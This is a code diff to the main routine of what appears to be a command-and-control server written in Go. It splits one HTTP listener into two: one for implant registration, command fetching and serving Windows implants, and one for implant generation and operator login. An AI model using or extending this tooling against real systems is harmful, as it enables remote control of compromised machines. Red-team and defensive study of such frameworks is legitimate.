@@ -30,25 +30,43 @@ func main() {
 		panic(err)
 	}
 
-	serverip := config[0].Server[0].IP
-	serverport := config[0].Server[0].Port
-	var socket = serverip + ":" + serverport
+	// First server config
+	serverIP1 := config[0].Server[0].IP
+	serverPort1 := config[0].Server[0].Port
+	var socket1 = serverIP1 + ":" + serverPort1
 
-	http.HandleFunc("/registerNewImplant", registerNewImplant)
-	http.HandleFunc("/fetchCommand", fetchCommand)
-	http.HandleFunc("/fetchOutput", fetchOutput)
-	http.HandleFunc("/getClients", getClients)
-	http.HandleFunc("/agents/windows/powershell", powerShellImplant)
-	http.HandleFunc("/agents/windows/cs", windowsImplant)
-	http.HandleFunc("/generate/windows/implant", generateImplant)
-	http.HandleFunc("/getStoredOutput", getStoredOutput)
-	http.HandleFunc("/operators/register", registerOperatorHandler)
-	http.HandleFunc("/operators/login", loginOperatorHandler)
+	// Second server config
+	serverIP2 := config[0].Server[1].IP
+	serverPort2 := config[0].Server[1].Port
+	var socket2 = serverIP2 + ":" + serverPort2
 
-	fmt.Println("Listening on: " + socket)
+	// Mux for server1
+	mux1 := http.NewServeMux()
+	mux1.HandleFunc("/registerNewImplant", registerNewImplant)
+	mux1.HandleFunc("/fetchCommand", fetchCommand)
+	mux1.HandleFunc("/fetchOutput", fetchOutput)
+	mux1.HandleFunc("/agents/windows/cs", windowsImplant)
 
-	err = http.ListenAndServe(socket, nil)
+	// Mux for server2
+	mux2 := http.NewServeMux()
+	mux2.HandleFunc("/agents/windows/powershell", powerShellImplant)
+	mux2.HandleFunc("/generate/windows/implant", generateImplant)
+	mux2.HandleFunc("/getStoredOutput", getStoredOutput)
+	mux2.HandleFunc("/operators/register", registerOperatorHandler)
+	mux2.HandleFunc("/operators/login", loginOperatorHandler)
+	mux2.HandleFunc("/getClients", getClients)
+
+	go func() {
+		fmt.Println("Implant Server: " + socket1)
+		err := http.ListenAndServe(socket1, mux1)
+		if err != nil {
+			log.Fatal("ListenAndServe for socket1: ", err)
+		}
+	}()
+
+	fmt.Println("Admin Server: " + socket2)
+	err = http.ListenAndServe(socket2, mux2)
 	if err != nil {
-		log.Fatal("ListenAndServe: ", err)
+		log.Fatal("ListenAndServe for socket2: ", err)
 	}
 }
